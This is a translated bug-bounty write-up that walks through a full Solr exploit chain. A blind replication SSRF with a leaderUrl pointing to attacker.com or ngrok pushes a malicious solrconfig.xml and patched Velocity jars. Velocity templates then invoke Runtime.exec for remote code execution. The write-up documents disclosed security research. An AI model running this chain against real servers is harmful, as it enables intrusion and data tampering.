#  一种非常优雅的获取 Solr 服务器 RCE 的方法   
hacefresko  securitainment   2025-04-30 05:38  
  
> 【翻译】A very fancy way to obtain RCE on a Solr server   
  
  
大家好！在这篇文章中，我将讨论我迄今为止发现的最优美且复杂的漏洞之一，以及它如何被归类为"重复"，尽管我是唯一实现 RCE 的人。我在几周前发现了这个漏洞，它属于与我之前文章中描述的相同的漏洞赏金计划。和之前一样，由于这是一个私人计划，我需要隐藏一些信息。不过，我可以告诉你，它属于最大的游戏公司之一，这家公司与黑客和其他技术爱好者关系并不太好 ;)。  
  
另外，值得一提的是，我在这项研究中遇到了许多死胡同，也省略了一些不太有趣的 Solr 细节，因为这篇文章已经变得太长且技术性太强。希望你喜欢它，并觉得它和我一样有趣！  
## 前期工作  
  
这个故事始于去年，当时我在一个私人计划中的不同 Solr 服务器上发现了三个漏洞。正如前面提到的，其中一些漏洞在本博客的另一篇文章中有描述。我强烈建议阅读它，因为它可以作为本文将要讨论的一些 Solr 概念的介绍。  
  
![](https://mmbiz.qpic.cn/mmbiz_png/hoiaQy7WhTCOdoKSTvEall0dicgCTr41IBdF4MaEYj67PpribUzMgecX1jM50QnG6O8cQcnIYicRdPibGibPicMJYEEyg/640?wx_fmt=png&from=appmsg "")  
  
在此期间，我还在其中一个 Solr 服务器中发现了一个已知的盲 SSRF，编号为 CVE-2021-27905，该服务器仅包含所有欧洲商店的前端数据（产品名称、价格、链接等）。这个服务器可以自由查询，没有任何私人信息。由于这不是一个高严重性或关键严重性的漏洞，我没有报告它，而是决定保留它，以备将来可能作为更复杂利用链的一部分使用。最后，我把它放在一边，转而进行其他不相关的项目。  
  
几个月后（在撰写本文时是两周前），我决定花更多时间进行漏洞赏金计划。我认为检查我之前报告的漏洞的所有笔记可能是一个很好的起点，以防有什么变化。目标是进入状态，并尝试让我的思维准备好持续进行黑客攻击，因为在我的职业生涯中，我发现心理方面是进行漏洞赏金时最困难的部分。  
  
现在，带着更积极的心态，当我记得在一个已经发现两个高严重性和一个关键漏洞的计划中还有一个盲 SSRF 时，我知道我必须再看一看。然而，这次我将采取更类似研究的方法，并决定更深入地研究 Solr。我很快验证了盲 SSRF 仍然可利用，并立即投入其中。  
## 理解盲 SSRF  
  
我的第一个目标是完全理解这个盲 SSRF，因为我最初是通过寻找常见的 Solr 漏洞发现它的，并没有深入研究。它位于 "/solr/<core>/replication  
"，这是一个核心的复制请求处理器。本质上，核心是 Solr 服务器中可用的不同数据集。在这种情况下，服务器为每种语言都有一个核心。例如，使用 "de" 核心，可以通过访问以下 URL 触发漏洞：  
  
https://target.com/solr/de/replication?command=fetchindex&leaderUrl=https://attacker.com  
  
为了了解更多关于这个漏洞涉及的所有功能，我需要查看 Solr 文档。幸运的是，Apache 维护了一个庞大的门户网站来托管 Solr 文档，所以不难找到与索引复制相关的章节。正如我所了解的，复制允许创建多个 Solr 实例的基础设施，其中领导者实例将其数据的副本分发给跟随者实例。领导者管理数据更新，而跟随者管理查询。  
  
![](https://mmbiz.qpic.cn/mmbiz_png/hoiaQy7WhTCOdoKSTvEall0dicgCTr41IB5zrNlCvRCTRLHQkZic7ge0aVtddVibGwwkHrvM4ua9tec3ibWAukkQaWA/640?wx_fmt=png&from=appmsg "")  
  
参与此基础设施的每个实例都必须有一个可用的复制请求处理器（"/replication"），它根据是领导者还是跟随者接受一系列命令。这些命令在索引复制章节的其中一个部分中有详细说明，其中 "fetchindex" 描述如下：  
```
fetchindex

  Force the specified follower to fetch a copy of the index from its leader.

    http://_follower_host:port_/solr/_core_name_/replication?command=fetchindex

  You can pass an extra attribute such as leaderUrl or compression (or any other parameter described in Configuring a Follower Server) to do a one time replication from a leader. This removes the need for hard-coding the leader URL in the follower configuration.
```  
  
这意味着我发现盲 SSRF 漏洞的 Solr 服务器是一个 follower 实例，可以通过指定 leader 来使用 "fetchindex" 命令执行一次性复制。  
  
了解到这一点后，我首先想到的是也许可以创建一个恶意的 Solr 服务器作为 leader，并将我自己的数据副本分发到目标服务器。由于目标 Solr 服务器包含了该公司所有欧洲商店的数据，这意味着我将能够修改这些商店的内容！这听起来很棒，但还有很长的路要走。  
  
在进一步研究时，我还了解了其他复制命令，例如 "details"，它可以用来获取复制配置：  
  
https://target.com/solr/de/replication?command=details  
  
在这种情况下，服务器返回了一个巨大的 JSON 响应，当时我并没有完全理解。然而，我从这个输出中能够解读到的一点是，服务器也允许其他人从中复制数据，这意味着我可能可以下载整个数据集。  
  
这将非常有用，因为理论上，我可以先复制数据集，添加一个测试条目，然后将其分发回目标服务器。这样，我就可以通过查询新添加的条目来证明我能够修改数据集，而不会破坏属于公司商店的任何数据。  
  
很好。现在的第一步是部署一个本地的 Solr 实例，并检查是否可以从目标服务器复制数据集。  
## 创建我自己的 Solr 实例  
  
于是，我从 Solr 官网下载了最新的二进制版本，并按照他们的部署指南进行操作。这个二进制版本包含一个命令行界面工具，可以启动/停止 Solr、管理核心等。这样，可以使用以下命令在端口 9000 上启动一个新的 Solr 服务器：  
  
$ bin/solr start -p 9000  
  
"start" 命令完成后，可以通过 "http://127.0.0.1:9000/" 访问管理界面：  
  
![](https://mmbiz.qpic.cn/mmbiz_png/hoiaQy7WhTCOdoKSTvEall0dicgCTr41IBeEenhoAf259LIciajsVd6Znqr1EhApkQj7giaD8FkoeGMUKIlMcgDybA/640?wx_fmt=png&from=appmsg "")  
  
下一步是创建一个核心。以下命令创建了一个名为 "hacefresk0" 的新空核心：  
  
$ bin/solr create -c hacefresk0  
  
然后可以在 select 请求处理器中查询它：  
  
![](https://mmbiz.qpic.cn/mmbiz_png/hoiaQy7WhTCOdoKSTvEall0dicgCTr41IBiaAusiaFFZBhWAwOWXd0hyiaWelcH9K02vYiaeM79yNGOvic60m4MRlvwrw/640?wx_fmt=png&from=appmsg "")  
  
接下来，我需要为核心配置复制请求处理器，使其成为目标服务器的 follower。为此，我需要编辑位于 "server/solr/hacefresk0/conf/solrconfig.xml" 的核心配置文件，并添加以下元素：  
```
<requestHandler name="/replication" class="solr.ReplicationHandler"> <lst name="slave"> <str name="leaderUrl">https://target.com/solr/de/</str> <str name="pollInterval">00:00:20</str> </lst> </requestHandler>
```  
  
重启服务器后，我应该能够使用复制端点中的 "fetchindex" 命令复制数据集。然而，服务器返回了以下错误：  
  
![](https://mmbiz.qpic.cn/mmbiz_png/hoiaQy7WhTCOdoKSTvEall0dicgCTr41IBtRIDpFJnFeNx1flyfphtRedQYJIiclluNteLBOmpfgVTrJzWwjCqJ5g/640?wx_fmt=png&from=appmsg "")  
  
经过一番搜索后，我发现 Solr 现在要求指定的 "leaderUrl" 必须被显式加入白名单，或者在启动时使用 "-Dsolr.disable.allowUrls=true" 标志。我觉得这很有趣，因为这意味着目标服务器可能也在使用这个标志，尽管 Solr 警告说这不是一个安全的做法。无论如何，我使用该标志重新启动了服务器：  
  
$ bin/solr stop; bin/solr start -p 9000 -Dsolr.disable.allowUrls=true  
  
我再次执行了 "fetchindex" 命令，并成功从目标服务器复制了数据集！  
  
![](https://mmbiz.qpic.cn/mmbiz_png/hoiaQy7WhTCOdoKSTvEall0dicgCTr41IBrDT982DQwr9JPDp1EHsVqpNTPX0VibUGNQIrx0OCyMl8jibL6IpuSMIw/640?wx_fmt=png&from=appmsg "")  
  
现在我可以在本地查询它了：  
  
![](https://mmbiz.qpic.cn/mmbiz_png/hoiaQy7WhTCOdoKSTvEall0dicgCTr41IBETfXBcxZ5GcSjgwNuuSkxwYDnQfvMCKPleicwdvtBqEzISk3icqpZN8g/640?wx_fmt=png&from=appmsg "")  
  
正如我之前提到的，请注意这个数据集是公开的，不包含任何私人信息，因此这种行为本身并不是一个漏洞。  
  
接下来要做的是添加一个无害的条目，以证明我可以修改数据库。为此，我首先使用复制命令 "disablepoll" 停止从目标服务器轮询更多数据，因为新的复制会覆盖本地更改。然后，我添加了一个 ID 为 "1337"、标题为 "Hacked by hacefresk0" 的条目 :P  
  
![](https://mmbiz.qpic.cn/mmbiz_png/hoiaQy7WhTCOdoKSTvEall0dicgCTr41IBhcktL1VsYxCttTiazUg1dqVuhpCZsG35DUZt82MFBC82aD4E46sdGfg/640?wx_fmt=png&from=appmsg "")  
  
此时，我拥有了目标服务器数据集的副本，并添加了一个新的 1337-elite-hacker 条目。现在，我需要检查是否真的可以将这个数据集分发到目标服务器，或者这一切是否只是一个死胡同。  
## 复制到目标服务器  
  
为了将我的本地服务器配置为复制领导者（leader）而不是跟随者（follower），我需要修改之前添加到核心配置文件中的复制请求处理器的配置：  
```
<requestHandler name="/replication" class="solr.ReplicationHandler">
    <lst name="leader">
        <str name="replicateAfter">optimize</str>
        <str name="backupAfter">optimize</str>
    </lst>
</requestHandler>
```  
  
随后，我重启了服务器以使更改生效，并使用 ngrok 将本地 leader 服务器暴露到互联网：  
  
$ ngrok http 9000  
  
为了验证复制 leader 是否正常工作，我首先在本地进行了测试。我创建了一个名为 "replica" 的新 core，并使用 "ngrok" 提供的 URL 将其配置为 leader 的 follower：  
```
<requestHandler name="/replication" class="solr.ReplicationHandler">
    <lst name="slave">
        <str name="leaderUrl">https://<ngrok_url>/solr/hacefresk0/</str>
        <str name="pollInterval">00:00:20</str>
    </lst>
</requestHandler>
```  
  
随后，我执行了 "fetchindex" 命令，并成功从本地 leader 服务器复制了数据集！  
  
![](https://mmbiz.qpic.cn/mmbiz_png/hoiaQy7WhTCOdoKSTvEall0dicgCTr41IBCQfYQ2oCZgica3YjibiaXia6aeTCbqp2Bl1xCRwibiax8WXn63s0CZzS8jOw/640?wx_fmt=png&from=appmsg "")  
  
现在是时候在目标服务器上执行这个操作了。我访问了以下 URL 来触发复制：  
  
https://target.com/solr/de/replication?command=fetchindex&leaderUrl=https://<ngrok_url>/solr/hacefresk0/  
  
然而...ngrok 没有收到任何连接 :/ 我多次重复这个过程并重置了所有设置，但仍然无法使其正常工作。我再次进行了与之前相同的本地测试，测试成功了，但我无法在目标服务器上执行，所以我暂时搁置了这个问题，休息了几天。  
  
然后，在玩电子游戏时，我突然想到。我不知道目标服务器使用的 Solr 版本，也许本地服务器和目标服务器之间的版本差异阻止了复制。  
  
我重新开始工作，并尝试在目标服务器上触发一些错误，看看是否能泄露 Solr 版本，直到我找到了它！它使用的是 8.11 版本（我不记得具体是如何触发错误的，因为我只记录了版本号，但可能是复制请求处理器中的某些内容）。我立即从 Solr 官网 下载了 Solr 8.11 的二进制版本，并开始重建相同的测试环境。  
  
当一切准备就绪后，我在目标服务器上使用 "fetchindex" 命令触发了复制...它成功了！当我查询自定义的 1337 条目时，它已经在那里供所有人查看了：  
  
![](https://mmbiz.qpic.cn/mmbiz_png/hoiaQy7WhTCOdoKSTvEall0dicgCTr41IBibjPbiaSdFIScWIeibpJNcUP0poTYaKsUWGjLyy9uyWnjONDRwDb6svAQ/640?wx_fmt=png&from=appmsg "")  
  
我成功地修改了该公司每个欧洲商店的数据，这意味着我可以篡改它们，插入恶意链接等等！然而，既然我能够将数据分发到目标 Solr 服务器，我想知道我还能做些什么。  
## 修改目标服务器配置  
  
早些时候，在阅读 Solr 关于创建复制 leader 的文档 时，我瞥见了复制请求处理器配置中 "leader" 元素的一个可能参数：  
```
confFiles

    Optional | Default: none

    The configuration files to replicate to the follower, separated by a comma. These should be files such as the schema, stopwords, and similar configuration files that may change on the leader and need to be updated on the follower to use when serving queries.

    [...]
```  
  
在确认复制功能确实可行后，我决定进一步深入研究。本质上，这个参数允许 leader 指定一组与 "solrconfig.xml" 位于同一目录的配置文件，这些文件将被复制到 follower 中。一旦接收，这些文件会被加载，就像服务器重启了一样。同时，还可以指定这些配置文件在到达 follower 后使用的文件名。  
  
我想测试是否能够利用这个参数向目标服务器传递任意配置文件。因此，我创建了一个名为 "hacefresk0-config.xml" 的新文件，该文件在目标服务器上将被重命名为 "solrconfig.xml"，从而覆盖其原有的配置文件。为了能够分发这个文件，我在本地服务器的复制请求处理器中添加了相应的 "confFiles" 元素：  
```
<requestHandler name="/replication" class="solr.ReplicationHandler">
    <lst name="leader">
        <str name="replicateAfter">optimize</str>
        <str name="backupAfter">optimize</str>
        <str name="confFiles">hacefresk0-config.xml:solrconfig.xml</str>
    </lst>
</requestHandler>
```  
  
文件 "hacefresk0-config.xml" 是基于 Solr 8.11 默认的 "solrconfig.xml" 进行修改后的副本。由于 "details" 命令的服务器响应中显示了 leader URL，我添加了一个自定义的 URL 来验证新的配置是否能够成功加载到服务器中。我使用的 leader URL 就是当前的 URL，它对应公司的一个内部服务器，但明确指定了 "443" 端口：  
```
<requestHandler name="/replication" class="solr.ReplicationHandler">
    <lst name="slave">
        <str name="leaderUrl">https://leader.target.com:443/solr/de/</str>
        <str name="pollInterval">00:00:20</str>
    </lst>
</requestHandler>
```  
  
和之前一样，我重启了本地服务器，并在目标服务器上使用 "fetchindex" 命令触发了复制。我在 ngrok 接口上收到了多个请求，表明复制已成功执行。当我在目标服务器上执行 "details" 命令时，显示 "hacefresk0-config.xml" 已被正确复制，且 leader URL 现在包含了 ":443"，这意味着我成功修改了目标服务器的配置！  
  
![](https://mmbiz.qpic.cn/mmbiz_png/hoiaQy7WhTCOdoKSTvEall0dicgCTr41IBdGvYko8s2UvmpzMhyrEKPqB0TtnAlo4oDXIia3aFZQOk9SGgQJ5Qx7w/640?wx_fmt=png&from=appmsg "")  
  
下一步是尝试利用这种行为来实现 RCE（远程代码执行）。  
## 寻找实现 RCE 的 gadget  
  
此时，我开始寻找 Solr 中已知的 RCE 漏洞，并研究是否可以通过修改核心配置文件来触发这些漏洞。除了 Solr 官方文档外，我还阅读了许多有用的文章，例如这篇关于 "Solr 注入" 的文章和这篇专门讨论 Solr RCE 的文章。此外，正如我另一篇关于 Solr 的博客文章中提到的，我查看了nuclei 模板仓库，这始终是寻找漏洞利用的好资源。  
  
结果，我发现许多案例表明在早期版本中可以通过配置文件启用危险功能，但后来开发者限制了这些功能，使其只能通过 Solr 二进制文件或环境变量来管理。例如，远程流处理就是这种情况。另一个重大限制是目标服务器只允许访问 "/select" 和 "/replication"，这意味着我无法使用任何最终依赖其他请求处理器的漏洞利用。  
  
经过多次探索，我最终决定使用Velocity 模板，这是一种非常强大的基于 Java 的模板，过去曾被用于利用 Solr。以下是一个简单的示例：  
```
<html>
    <body>
        Hello $customer.Name!
        <table>
        #foreach( $mud in $mudsOnSpecial )
            #if ( $customer.hasPurchased($mud) )
                <tr>
                    <td>$flogger.getPromo( $mud )</td>
                </tr>
            #end
        #end
        </table>
    </body>
</html>
```  
  
在早期版本中，可以通过 "/config" 配置请求处理器来启用 Velocity 引擎并提供自定义模板以实现 RCE（远程代码执行）。当开发者发现这个问题后，他们限制了其管理方式，使其只能通过 "solrconfig.xml" 配置文件进行配置。  
  
考虑到我可以修改目标服务器的配置文件，这种情况似乎很完美。然而，这里有一个小问题。在当前版本中，运行 Velocity 引擎所需的 .jar 库不再默认与 Solr 捆绑，因为自 9.0 版本以来它已被弃用，因此必须手动添加。为此，需要将这些 .jar 文件放置在 Solr 可访问的目录中，并在配置文件中引用。  
  
这感觉像是一个死胡同，但随后我有了一个想法。也许，如果我能够向目标服务器提供任意配置文件，我也许能够提供 .jar 文件。由于它们是通过 "solrconfig.xml" 加载的，而我可以修改这个文件，我将能够在目标服务器上启用 Velocity 引擎。但首先，我需要找到这些 .jar 文件 :D。  
  
事实证明，这些文件现在可以在 GitHub 仓库 中找到，这是一个第三方 Solr 插件的仓库，该插件在 Velocity 被弃用后"取代"了它。我下载了 .jar 文件，并开始设置本地测试环境，以检查是否可以将它们从 leader 复制到 follower。  
  
我启动了两个 Solr 实例：一个 leader 和一个 follower。我将 Velocity 的 .jar 文件复制到 leader 的 "solrconfig.xml" 所在目录（"server/solr/leader/conf/"）中，并配置它在复制时分发这些文件：  
```
<requestHandler name="/replication" class="solr.ReplicationHandler">
    <lst name="leader">
        <str name="replicateAfter">optimize</str>
        <str name="backupAfter">optimize</str>
        <str name="confFiles">solritas-0.9.5.jar,velocity-engine-core-2.1.jar,velocity-tools-generic-3.0.jar</str>
    </lst>
</requestHandler>
```  
  
对于 follower 节点，我配置了一个简单的 follower 复制请求处理器，指向 leader 实例：  
```
<requestHandler name="/replication" class="solr.ReplicationHandler">
    <lst name="slave">
        <str name="leaderUrl">http://localhost:9000/solr/leader/</str>
        <str name="pollInterval">00:00:20</str>
    </lst>
</requestHandler>
```  
  
我在 leader 节点中添加了一些测试数据，以确保有内容可以复制（否则复制将不会发生），并在 follower 实例上执行了 "fetchindex" 命令。.jar 文件成功地从 leader 节点分发到了 follower 节点！  
  
![](https://mmbiz.qpic.cn/mmbiz_png/hoiaQy7WhTCOdoKSTvEall0dicgCTr41IBumxcB7o5viaKj1lrHlB2LUUoRhequNoxTyE4MG2DtMhcJUEQPxKG4GQ/640?wx_fmt=png&from=appmsg "")  
  
在确认能够分发 .jar 库文件后，我需要测试是否能够实际启用 Velocity 引擎。由于我已经知道可以远程修改配置文件，为了节省时间，我手动编辑了 follower 节点的 "solrconfig.xml" 文件。我添加了一个 "<lib>  
" 元素来导入 "server/solr/follower/conf/" 目录下的所有 .jar 库文件，并添加了一个 "<queryResponseWriter>  
" 元素来启用 Velocity：  
```
<lib dir="conf/" regex=".*\.jar"/>

<queryResponseWriter name="velocity" class="solr.VelocityResponseWriter">
    <str name="template.base.dir"></str>
</queryResponseWriter>
```  
  
随后，我重启了服务器并访问了"/select?q=1&wt=velocity&v.template=browse&v.layout=layout  
"，成功渲染了默认的 Velocity 模板 "browse"，这意味着 Velocity 引擎已被成功启用：  
  
![](https://mmbiz.qpic.cn/mmbiz_png/hoiaQy7WhTCOdoKSTvEall0dicgCTr41IB9b9WBKj1JlZ2u5QCicm6q5Zdzh4Jj6YIoqIv94xaRDUx5DlSB5G27Cw/640?wx_fmt=png&from=appmsg "")  
  
到目前为止，我通过分发所需的 .jar 库文件和自定义的 "solrconfig.xml" 文件成功启用了 Velocity 引擎。唯一缺失的部分是提供一个恶意的 Velocity 模板来实现 RCE（远程代码执行）。在早期版本中，一旦启用了 Velocity，可以直接通过 "/select" 请求处理器中的 URL 参数来实现，就像我之前渲染默认的 "browse" 模板一样。然而，当我尝试这样做时，我发现 Velocity 现在只支持从本地文件系统执行模板。由于我能够提供任意文件，这并不构成问题，因此我直接在我的本地服务器上渲染了一个恶意模板，以检查是否真的能够实现 RCE。  
  
我创建了一个简单的模板，它将在服务器上执行 "id" 命令，并将其保存为 "rce.vm"，路径为 "server/solr/follower/conf/velocity/rce.vm  
"：  
```
#set($x='') #set($rt=$x.class.forName('java.lang.Runtime')) #set($chr=$x.class.forName('java.lang.Character')) #set($str=$x.class.forName('java.lang.String')) #set($ex=$rt.getRuntime().exec('id')) $ex.waitFor() #set($out=$ex.getInputStream()) #foreach($i in [1..$out.available()]) $str.valueOf($chr.toChars($out.read())) #end
```  
  
我重启了服务器并访问了"/select?q=1&wt=velocity&v.template=rce"来渲染模板...但它并没有执行"id"命令：  
  
![](https://mmbiz.qpic.cn/mmbiz_png/hoiaQy7WhTCOdoKSTvEall0dicgCTr41IBZ2oj8iaKIthAqvbFvytK7YibyxZ5gAu4bcQ1W3qzx8wKuGQ7fuccG6pA/640?wx_fmt=png&from=appmsg "")  
  
在多次检查模板语法是否正确并在网上搜索了数小时后，我"大概明白了"为什么它没有正确渲染。看起来 Velocity 引擎被配置为不允许实例化新类（这与一个名为"SecureUberspector"的内部类有关，如果你感兴趣可以查看这个 issue）。这本质上意味着"$x.class.forName()"的调用根本没有被执行。该死。  
  
此时，我已经没有想法了，于是休息了几天。  
## 修补 Velocity  
  
某天晚上，在重新查看我的笔记时，我想也许能在Velocity 插件 github 仓库中找到一些答案，因为它也包含了 Velocity .jar 文件的 Java 代码。我搜索了字符串"SecureUberspector"，令我惊讶的是，有两个结果：  
  
![](https://mmbiz.qpic.cn/mmbiz_png/hoiaQy7WhTCOdoKSTvEall0dicgCTr41IBRiaSwZaibksswKgSLqKSw7rccucYFJbXFvgQ3nWH6DqkRxGlMP1bKXgg/640?wx_fmt=png&from=appmsg "")  
  
第一个结果对应的是在"solr-velocity/src/main/java/org/apache/solr/response/VelocityResponseWriter.java"中负责禁用新类实例化的代码片段！  
  
![](https://mmbiz.qpic.cn/mmbiz_png/hoiaQy7WhTCOdoKSTvEall0dicgCTr41IBiclXHia0GxwkMEqlL1ZXRIAPxpQwNrya4Dzt8349qNLmOW6VWLZq0WGg/640?wx_fmt=png&from=appmsg "")  
  
嗯，这很令人兴奋。也许我可以删除这些行并重新编译.jar 文件，这样生成的 Velocity 引擎就没有限制了。经过一些尝试和错误，并修复了项目"pom.xml"文件中的一个损坏的依赖项后，我成功重新编译了.jar 文件：  
  
![](https://mmbiz.qpic.cn/mmbiz_png/hoiaQy7WhTCOdoKSTvEall0dicgCTr41IBmcVopBIXQ8bt02nvTeopaQMibE1xDCibEzC16DTjyB5CicDnUjqdlKhFA/640?wx_fmt=png&from=appmsg "")  
  
我用这些新的 Velocity 库替换了本地 Solr 实例中的旧库，其中 Velocity 已经在之前的测试中配置好了，然后再次尝试访问"/select?q=1&wt=velocity&v.template=rce"来渲染"rce.vm"模板：  
  
![](https://mmbiz.qpic.cn/mmbiz_png/hoiaQy7WhTCOdoKSTvEall0dicgCTr41IBxu7NHqVa5ErtNwjzbtGwFgrdxN4N7GFsj2PrtJKTqbjEInfZgjfHkQ/640?wx_fmt=png&from=appmsg "")  
  
太棒了！我有了一个在目标服务器上实现 RCE 的理论漏洞利用方法！现在，我需要测试它。既然我已经在重新编译 Velocity 插件并分发自定义的.jar 库，我认为修改.jar 文件中捆绑的默认"browse"模板会更酷，这样我就不必随这些库一起分发恶意模板了。于是，我编辑了"src/main/resources/browse.vm"模板，并创建了一个 PoC，通过执行"id"命令来证明我能够在目标服务器上实现 RCE：  
```
<title>Hacked by hacefresk0</title>
<h1>Hacked by hacefresk0</h1>
<br>
<pre>
#set($x='') #set($rt=$x.class.forName('java.lang.Runtime')) #set($chr=$x.class.forName('java.lang.Character')) #set($str=$x.class.forName('java.lang.String')) #set($ex=$rt.getRuntime().exec('id')) $ex.waitFor() #set($out=$ex.getInputStream()) #foreach($i in [1..$out.available()])$str.valueOf($chr.toChars($out.read()))#end
</pre>
```  
  
我重新编译了 .jar 库并准备漏洞利用。以下是实现目标服务器 RCE（远程代码执行）的步骤回顾：  
1. 创建一个恶意的本地 Solr 服务器，作为目标服务器的 follower（从节点）  
  
1. 从目标 Solr 服务器复制数据集，以确保原始数据不会丢失  
  
1. 将本地服务器配置为 leader（主节点），分发恶意的 "solrconfig.xml" 文件和修改后的 Velocity .jar 库以及数据集  
  
1. 触发从本地服务器到目标服务器的复制  
  
1. 访问目标服务器中修改后的 "browse" 模板，该模板将执行 "id" 命令  
  
由于我的本地 Solr 实例 "hacefresk0" 已经包含了目标服务器的数据集，我将其复制请求处理器配置为 leader，为目标服务器提供恶意的 "solrconfig.xml" 文件和修改后的 Velocity .jar 库：  
```
<requestHandler name="/replication" class="solr.ReplicationHandler">
    <lst name="leader">
        <str name="replicateAfter">optimize</str>
        <str name="backupAfter">optimize</str>
        <str name="confFiles">malicious-solrconfig.xml:solrconfig.xml,solritas-0.9.5.jar,velocity-engine-core-2.1.jar,velocity-tools-generic-3.0.jar</str>
    </lst>
</requestHandler>
```  
  
恶意的"solrconfig.xml"文件包含了一个"<lib>  
"元素用于导入.jar 库，一个"<queryResponseWriter>  
"元素用于启用 Velocity，以及一个配置为当前目标 leader 的 follower（从节点）的复制请求处理器，这样我就不会严重破坏他们的复制基础设施：  
```
<lib dir="conf/" regex=".*\.jar"/>

<queryResponseWriter name="velocity" class="solr.VelocityResponseWriter">
    <str name="template.base.dir"></str>
</queryResponseWriter>

<requestHandler name="/replication" class="solr.ReplicationHandler">
    <lst name="slave">
        <str name="leaderUrl">https://leader.target.com:443/solr/de/</str>
        <str name="pollInterval">00:00:20</str>
    </lst>
</requestHandler>
```  
  
现在，我通过访问以下 URL 触发了目标服务器的复制：  
```
https://target.com/solr/de/replication?command=fetchindex&leaderUrl=https://<ngrok_url>/solr/hacefresk0/
```  
  
当我在 ngrok 界面中看到相应的连接，表明复制成功后，我访问了目标服务器中的恶意"browse"模板："<https://target.com/solr/de/select?q=*&wt=velocity&v.template=browse>  
"。命令"id"已在服务器上成功执行 :D  
  
![](https://mmbiz.qpic.cn/mmbiz_png/hoiaQy7WhTCOdoKSTvEall0dicgCTr41IB8TOibGQn2KXxv2gJdeVUZ4PhWaVhOgCKRK4RvAopRkzmEJpVvwYkKcQ/640?wx_fmt=png&from=appmsg "")  
## 报告与结论  
  
我将这个 RCE（远程代码执行）漏洞报告给了公司的漏洞赏金计划，希望能获得丰厚的奖励。然而，几天后，他们决定以重复报告为由关闭我的报告，这让我感到非常奇怪。虽然我无法查看被标记为重复的那份报告，但我知道它的严重性评分为 9.1，并且已经开放了 4 个月。此外，当我提交报告时，"/replication"端点立即被关闭，这让我认为另一份报告根本没有展示 RCE。最终，他们只支付了相当于关键漏洞赏金 10% 的金额，我认为这非常不公平。  
  
尽管这是一次非常令人沮丧的经历，我还是想与社区分享，因为这是我在实际环境中发现的最复杂、最精妙的漏洞。同时，我希望这篇文章能提醒大家不要为糟糕的漏洞赏金计划工作，我以后肯定不会这么做了。要意识到自己的价值，在将其给予他人之前要三思。  
  
